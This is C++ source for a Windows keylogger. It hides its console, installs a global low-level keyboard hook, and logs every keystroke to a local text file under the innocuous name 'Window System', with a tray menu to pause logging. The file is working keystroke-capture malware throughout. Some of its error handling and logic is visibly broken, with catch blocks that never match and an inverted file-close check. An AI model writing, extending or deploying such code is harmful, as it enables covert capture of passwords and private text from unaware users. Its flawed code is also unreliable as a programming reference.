#include <windows.h>
#include <fstream>
#include <commctrl.h>
#include "../include/resourse.hpp"

#pragma comment(lib, "user32.lib")

#define taskbar_name "Window System"

#define outfile_path "..\\log.txt"
#define TaskbarIco_Path "..\\icons\\taskbar.ico"

std::ofstream outfile;
time_t stop_time=-1;
HWND hwnd_handle;
HMENU popupMenu_handle;
UINT_PTR timer_handle;
HHOOK hook_handle;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void CALLBACK TimerProc(HWND, UINT, UINT_PTR, DWORD);

void Create_Wind(HINSTANCE);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
  outfile.open(outfile_path, std::ios::out | std::ios::trunc);
  try
  {
    if (!outfile.is_open())
      throw "error:when open file";
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    return 1;
  }

  HWND hwnd = GetConsoleWindow();
  try
  {
    if (hwnd == NULL)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }
  ShowWindow(hwnd, SW_HIDE);

  hook_handle = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)&LowLevelKeyboardProc, NULL, 0);
  try
  {
    if (hook_handle == NULL)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }

  timer_handle = SetTimer(NULL, 0, 60000, TimerProc); // 1min
  try
  {
    if (timer_handle == '\0')
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }

  Create_Wind(hPrevInstance);

  MSG msg = {};
  int flag = 1;
  while (flag != 0)
  {
    flag = GetMessage(&msg, NULL, 0, 0);
    try
    {
      if (flag > 0)
      {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
      }
      else if (flag < 0)
        throw GetLastError();
    }
    catch (const char *msg)
    {
      outfile << msg;
    }
  };

  if (!outfile.is_open())
    outfile.close();
  if (hook_handle != NULL)
    UnhookWindowsHookEx(hook_handle);
  if (timer_handle != '\0')
    KillTimer(NULL, timer_handle);
  return msg.wParam;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
  switch (uMsg)
  {
  case ID_CLICK:
    switch (lParam)
    {
    // case WM_LBUTTONDOWN:
    //   ShowWindow(hwnd,SW_NORMAL);
    //   break;
    case WM_RBUTTONDOWN:
      POINT pt;
      GetCursorPos(&pt);
      SetForegroundWindow((HWND)popupMenu_handle);
      switch (TrackPopupMenu(popupMenu_handle, TPM_RETURNCMD | TPM_BOTTOMALIGN | TPM_RETURNCMD, pt.x, pt.y, 0, hwnd, NULL))
      {
      case ID_ALLWAYS:
        stop_time=-1;
        break;
      case ID_5M:
        stop_time=time(NULL)+300;
        break;
      case ID_10M:
        stop_time=time(NULL)+600;
        break;  
      // case ID_INPUT:
      //   int tmp;
      //   stop_time=time(NULL)+60*tmp;
      //   break;   
      case ID_EXIT:
        PostQuitMessage(0);
        break;
      }
      break;
    }
    break;
  case WM_CLOSE:
    PostQuitMessage(0);
    break;
  case WM_DESTROY:
    PostQuitMessage(0);
    break;
  }
  return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{ 
  time_t tmp=time(NULL);
  if(tmp-(unsigned long long)stop_time<=0)
  {
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
      DWORD key = ((KBDLLHOOKSTRUCT *)lParam)->vkCode;
      if (key >= 'A' && key <= 'Z' || key >= '0' && key <= '9')
        outfile << (char)key;
      else if (key >= 0x70 && key <= 0x87)
        outfile << "F" << (key - 0x69);
      else
        switch (key)
        {
        case 0x08:
          outfile << "Backspace";
          break;
        case 0x09:
          outfile << "Tab";
          break;
        case 0x10:
          outfile << "Shift";
          break;
        case 0x11:
          outfile << "Ctrl";
          break;
        case 0x0C:
          outfile << "Delete";
          break;
        case 0x0D:
          outfile << "Enter";
          break;
        case 0x14:
          outfile << "Caps lock Down";
          break;
        case 0x1B:
          outfile << "Esc";
          break;
        case 0x20:
          outfile << "Space";
          break;
        case 0x25:
          outfile << "向左";
          break;
        case 0x26:
          outfile << "向上";
          break;
        case 0x27:
          outfile << "向右";
          break;
        case 0x28:
          outfile << "向下";
          break;
        default:
          outfile << "Unknow:" << key;
          break;
        }
      outfile << " ";
    }
    if (nCode >= 0 && wParam == WM_KEYUP)
    {
      DWORD key = ((KBDLLHOOKSTRUCT *)lParam)->vkCode;
      switch (key)
      {
      case 0x14:
        outfile << "Caps lock UP" << " ";
        break;
      }
    }
  }
  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void CALLBACK TimerProc(HWND, UINT, UINT_PTR, DWORD)
{
  outfile.close();
  outfile.open(outfile_path, std::ios::out | std::ios::app);
  try
  {
    if (!outfile.is_open())
      throw "error:when open file";
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }
}

void Create_Wind(HINSTANCE hInstance)
{
  const char CLASS_NAME[] = "Window System";
  WNDCLASSEXA wc = {};
  wc.cbSize = sizeof(WNDCLASSEX);
  wc.style = CS_BYTEALIGNCLIENT;
  wc.lpfnWndProc = WindowProc;
  wc.hIcon = NULL;
  wc.hInstance = hInstance;
  wc.lpszMenuName = NULL;
  wc.lpszClassName = CLASS_NAME;
  try
  {
    if (RegisterClassExA(&wc) == 0)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }

  hwnd_handle = CreateWindowA(CLASS_NAME, "Window System", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);
  try
  {
    if (hwnd_handle == NULL)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }
  ShowWindow(hwnd_handle, SW_HIDE);

  NOTIFYICONDATAA taskbar;
  taskbar.cbSize = sizeof(NOTIFYICONDATA);
  taskbar.hWnd = hwnd_handle;
  taskbar.uID = 1;
  taskbar.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
  taskbar.uCallbackMessage = ID_CLICK;
  taskbar.hIcon = (HICON)LoadImageA(NULL, TaskbarIco_Path, IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
  //taskbar.hIcon = (HICON)LoadImage(NULL,MAKEINTRESOURCEA(IDI_TASKBAR), IMAGE_ICON, 0, 0, 0);
  strcpy_s(taskbar.szTip, sizeof(taskbar_name), taskbar_name);
  taskbar.dwState = NIS_SHAREDICON;
  Shell_NotifyIconA(NIM_ADD, &taskbar);

  popupMenu_handle = CreatePopupMenu();
  try
  {
    if (popupMenu_handle == NULL)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }

  try
  {
    if (AppendMenuA(popupMenu_handle, MF_STRING, ID_ALLWAYS, "Allways") == 0)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }
  try
  {
    if (AppendMenuA(popupMenu_handle, MF_STRING, ID_5M, "5min") == 0)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }
  try
  {
    if (AppendMenuA(popupMenu_handle, MF_STRING, ID_10M, "10min") == 0)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }
  // try
  // {
  //   if (AppendMenuA(popupMenu_handle, MF_STRING, ID_INPUT, "Input") == 0)
  //     throw GetLastError();
  // }
  // catch (const char *msg)
  // {
  //   MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
  //   PostQuitMessage(0);
  // }
  try
  {
    if (AppendMenuA(popupMenu_handle, MF_STRING, ID_EXIT, "Exit") == 0)
      throw GetLastError();
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }
}